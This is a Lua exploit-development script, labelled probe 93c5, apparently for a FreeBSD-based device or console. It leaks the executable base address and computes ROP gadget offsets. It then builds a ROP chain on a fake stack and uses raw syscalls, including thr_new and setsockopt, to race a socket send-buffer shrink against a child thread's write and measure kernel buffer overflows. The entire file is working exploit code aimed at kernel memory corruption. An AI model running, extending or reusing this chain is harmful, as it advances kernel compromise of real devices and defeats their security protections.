-- CRASH_CLASS: MODERATE
-- PROBE 93c5: SO_SNDBUF race — vary child write size, measure exact overflow
--
-- 93c4: child wrote 384 bytes with hiwat=1, 5/5 times. Is 384 fixed (min mbuf)?
-- Test: different child write sizes, different hiwat values, different fill levels

print("=== PROBE 93c5 ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))
local fsbase_ptr = memory.alloc(8)
wq(N(fsbase_ptr), uint64(N(fake_tcb)))

local sv = memory.alloc(4)
local ov = memory.alloc(4)
local ol = memory.alloc(4)
local dbuf = memory.alloc(0x1000)
local fill_buf = memory.alloc(256)
local sp = memory.alloc(8)
local res = memory.alloc(8)
local par = memory.alloc(0x40)
local tid = memory.alloc(8)
local stk = memory.alloc(0x4000)
local sb = N(stk)
local ss = 0x2000

local function run_trial(child_sz, shrink_to, label)
    if not alive() then return end

    wq(N(res), uint64(0xDEADDEAD))
    wd(N(sp), 0); wd(N(sp)+4, 0)
    local sr = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    if sr ~= 0 then return end
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp)+4) or -1

    wd(N(sv), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)

    local filled = 0
    for i = 1, 300 do
        local ok2, ret = pcall(function()
            return mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(256), uint64(0x80))
        end)
        if not ok2 then break end
        local v = sgn(ret)
        if v <= 0 then break end
        filled = filled + v
    end

    local off = 0
    for i = 0, ss - 1, 4 do wd(sb + i, 0) end
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(fW))
    emit(g_pop_rsi); emit(uint64(N(fill_buf)))
    emit(g_pop_rdx); emit(uint64(child_sz))
    emit(g_pop_rax); emit(uint64(4))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(N(res)))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(ss))
    wq(N(par) + 0x30, tid)

    pcall(function() mk(455)(par, uint64(0x38)) end)
    for w = 1, 10000 do local _ = rd(sb) end

    wd(N(sv), shrink_to)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)
    wd(N(ov), 0); wd(N(ol), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), ov, ol) end)
    local hw = rd(N(ov)) or -1

    -- Drain fully
    local total = 0
    for round = 1, 10 do
        local got = 0
        for d = 1, 200 do
            local ok4, dr = pcall(function()
                return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
            end)
            if not ok4 then break end
            local dv = sgn(dr)
            if dv <= 0 then break end
            got = got + dv
        end
        total = total + got
        if got == 0 then
            for w = 1, 50000 do local _ = rd(sb) end
            -- Try once more
            local ok5, dr = pcall(function()
                return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
            end)
            if ok5 and sgn(dr) > 0 then total = total + sgn(dr)
            else break end
        end
    end

    local extra = total - filled

    print(string.format("  %s: csz=%d hw=%d fill=%d drain=%d extra=%d%s",
        label, child_sz, hw, filled, total, extra,
        (extra > hw and hw > 0) and " ***OVERFLOW***" or ""))

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
end

-- Test matrix
print("")
print("[A] Vary child write size (hiwat=1)")
run_trial(64, 1, "64B")
run_trial(128, 1, "128B")
run_trial(256, 1, "256B")
run_trial(512, 1, "512B")
run_trial(1024, 1, "1K")
run_trial(4096, 1, "4K")
run_trial(16384, 1, "16K")

print("")
print("[B] Vary hiwat (child=4096)")
run_trial(4096, 1, "hw=1")
run_trial(4096, 128, "hw=128")
run_trial(4096, 256, "hw=256")
run_trial(4096, 512, "hw=512")
run_trial(4096, 1024, "hw=1K")
run_trial(4096, 4096, "hw=4K")

print("")
print("[C] No shrink control (child=4096, hiwat stays 65536)")
run_trial(4096, 65536, "noshrink")

print("")
print(string.format("alive=%s", alive() and "Y" or "N"))
print("=== 93c5 COMPLETE ===")
